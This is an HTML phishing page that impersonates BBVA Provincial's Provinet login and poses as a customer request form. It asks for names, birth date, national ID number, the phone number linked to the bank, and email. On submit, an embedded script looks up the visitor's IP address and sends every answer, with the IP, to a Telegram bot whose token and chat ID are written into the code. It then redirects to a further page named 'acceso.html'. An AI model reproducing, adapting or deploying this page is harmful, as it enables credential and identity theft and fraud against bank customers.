<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Formulario para solicitudes</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #fff;
      color: #2c3e50;
    }
    .header {
      background-color: #041e42;
      color: white;
      padding: 10px 20px;
    }
    .logo-container {
      display: flex;
      align-items: center;
      gap: 15px;
    }
    .logo {
      height: 30px;
    }
    .main-container {
      max-width: 600px;
      margin: 40px auto;
      padding: 0 20px;
    }
    h2 {
      text-align: center;
      margin-bottom: 30px;
    }
    .form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    label {
      display: flex;
      flex-direction: column;
      font-weight: 600;
    }
    input,
    select,
    textarea {
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      margin-top: 5px;
    }
    .submit-button {
      background-color: #041e42;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }
    .submit-button:hover {
      background-color: #032b60;
    }
    .info-text {
      font-size: 13px;
      color: #555;
      margin-top: -10px;
    }
    .footer {
      background-color: #041e42;
      color: white;
      padding: 30px 20px;
      text-align: center;
      margin-top: 40px;
    }
    .footer h3 {
      margin: 10px 0;
    }
    .social-icons {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin: 10px 0;
    }
    .social-icons img {
      width: 24px;
      filter: invert(1);
    }
    .motto {
      color: #4ba3ff;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <header class="header">
    <div class="logo-container">
      <img src="sWcfrrmLzrTYzVCUNLbZEiDXduVaAhFHEpUbQGvIUYakRtNmkNSvYyjmfZECxsHZ.png" alt="BBVA Provincial" class="logo" />
      <p>Acceso Provinet personas</p>
    </div>
  </header>

  <main class="main-container">
    <h2>Formulario para solicitudes</h2>
    <form class="form" id="formulario-solicitud">
      <label>Nombres <input type="text" name="nombres" required /></label>
      <label>Apellidos <input type="text" name="apellidos" required /></label>
      <label>Fecha de Nacimiento <input type="date" name="fecha" required /></label>
      <label>Número de Cédula de Identidad <input type="text" name="cedula" required /></label>
      <label>Nacionalidad:
        <select name="nacionalidad" required>
          <option value="">Selecciona una opción</option>
          <option value="V">Venezolano/a</option>
          <option value="E">Extranjero/a</option>
        </select>
      </label>
      <label>Número de teléfono asociado al banco <input type="tel" name="telefono" required /></label>
      <label>Correo Electrónico <input type="email" name="email" required /></label>
      <label>¿Tienes acceso al número registrado?
        <select name="acceso" required>
          <option value="">Selecciona una opción</option>
          <option>Sí</option>
          <option>No</option>
        </select>
      </label>
      <label>Motivo de la solicitud:
        <select name="motivo" required>
          <option value="">Selecciona una opción</option>
          <option>Problemas de acceso</option>
          <option>Solicitudes para créditos</option>
          <option>Solicitudes de tarjetas de crédito</option>
          <option>Actualización de datos</option>
          <option>Otro</option>
        </select>
      </label>
      <label>Datos Adicionales
        <textarea name="adicionales" placeholder="Describe tu problema aquí..." rows="4"></textarea>
      </label>
      <p class="info-text">
        Asegúrate de colocar los datos correctamente, es importante para nosotros validar su información de forma correcta.
      </p>
      <button type="submit" class="submit-button">Continuar</button>
    </form>
  </main>

  <footer class="footer">
    <div class="footer-content">
      <h3>BBVA Provincial</h3>
      <div class="social-icons">
        <a href="#"><img src="https://img.icons8.com/ios-filled/24/facebook-new.png" alt="Facebook" /></a>
        <a href="#"><img src="https://img.icons8.com/ios-filled/24/twitter.png" alt="Twitter" /></a>
        <a href="#"><img src="https://img.icons8.com/ios-filled/24/instagram-new.png" alt="Instagram" /></a>
        <a href="#"><img src="https://img.icons8.com/ios-filled/24/linkedin.png" alt="LinkedIn" /></a>
        <a href="#"><img src="https://img.icons8.com/ios-filled/24/youtube-play.png" alt="YouTube" /></a>
      </div>
      <p>© 2025 BBVA Provincial S.A. RIF: J-00002967-9</p>
      <p class="motto">Creando Oportunidades</p>
    </div>
  </footer>

  <script>
    const BOT_TOKEN = '8190060636:AAEbg9zqdIyLCZvUSSR4a_315D0W6n_ULVM';  // ← Reemplaza
    const CHAT_ID = '-4922278503';      // ← Reemplaza

    document.getElementById('formulario-solicitud').addEventListener('submit', async function(e) {
      e.preventDefault();

      const form = e.target;
      const data = Object.fromEntries(new FormData(form).entries());

      try {
        // Obtener la IP del usuario
        const ipInfo = await fetch('https://ipapi.co/ip/').then(res => res.text());

        // Crear mensaje para Telegram (sin usar Markdown)
        const mensaje = `
Nueva Solicitud

Nombre: ${data.nombres} ${data.apellidos}
Fecha Nacimiento: ${data.fecha}
Cédula: ${data.nacionalidad}-${data.cedula}
Teléfono: ${data.telefono}
Email: ${data.email}
Acceso a número: ${data.acceso}
Motivo: ${data.motivo}
Detalles: ${data.adicionales || 'N/A'}

IP: ${ipInfo}
        `;

        // Imprimir el mensaje en consola para depuración
        console.log('Mensaje:', mensaje);

        // Enviar mensaje a Telegram
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: mensaje,
          })
        });

        // Verificar la respuesta de Telegram
        const dataResponse = await response.json();
        if (dataResponse.ok) {
          window.location.href = 'acceso.html'; // Redirección después del envío
        } else {
          throw new Error('Error al enviar mensaje a Telegram');
        }
      } catch (error) {
        alert('Error al enviar los datos. Intenta nuevamente.');
        console.error(error);
      }
    });
  </script>
</body>
</html>
